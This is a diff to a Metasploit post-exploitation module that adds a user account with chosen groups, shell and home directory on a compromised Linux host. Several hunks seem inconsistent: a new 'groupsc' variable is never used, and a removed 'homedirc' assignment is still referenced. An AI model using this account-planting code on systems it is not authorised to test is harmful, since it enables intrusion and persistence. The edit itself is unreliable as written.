@@ -122,6 +122,7 @@ class MetasploitModule < Msf::Post
           cmd_exec("#{groupadd} #{group}")
           vprint_good("Added #{group} group")
         end
+        groupsc = groups.empty? ? '' : "--groups #{groups.join(',')}"
 
         # Finally run it
         cmd_exec("useradd --password #{passwd} #{homedirc} --groups #{groups.join(',')} --shell #{datastore['SHELL']} --no-log-init #{datastore['USERNAME']}")
@@ -158,6 +159,7 @@ class MetasploitModule < Msf::Post
           cmd_exec("#{groupadd} #{group}")
           vprint_good("Added #{group} group")
         end
+        groupsc = groups.empty? ? '' : "--groups #{groups.join(',')}"
 
         # Finally run it
         cmd_exec("adduser --password #{passwd} #{homedirc} --groups #{groups.join(',')} --shell #{datastore['SHELL']} --no-log-init #{datastore['USERNAME']}")
@@ -171,7 +173,6 @@ class MetasploitModule < Msf::Post
         cmd_exec("echo \'#{datastore['USERNAME']}:#{passwd}\'|chpasswd -e -c md5")
       else
         vprint_status('Unsure what platform were on. Using useradd in most basic/common settings')
-        homedirc = datastore['HOME'].empty? ? '-M' : "-d #{datastore['HOME']}"
 
         # Finally run it
         cmd_exec("useradd #{homedirc} -s #{datastore['SHELL']} #{datastore['USERNAME']}")
